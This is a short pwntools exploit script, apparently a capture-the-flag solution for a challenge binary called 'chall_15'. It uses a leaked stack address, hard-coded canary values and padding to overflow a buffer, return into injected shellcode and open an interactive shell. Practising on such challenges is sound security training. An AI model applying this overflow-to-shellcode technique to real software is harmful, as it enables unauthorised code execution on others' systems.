from pwn import *

elf = ELF("./chall_15")
context.arch = "amd64"
shellcode = asm(shellcraft.sh())
p = process("./chall_15")

p.recvuntil(b'\n')
leak = p.recv()
stackleak = int(leak, 16)

padding = b's' * 232
canary1 = p32(0xdeadd00d)
canary2 = p32(0xb16b00b5)
alignment = b's' * 8
return_address = p64(stackleak)

payload = shellcode + padding + canary1 + canary2 + alignment + return_address

p.sendline(payload)
p.interactive()
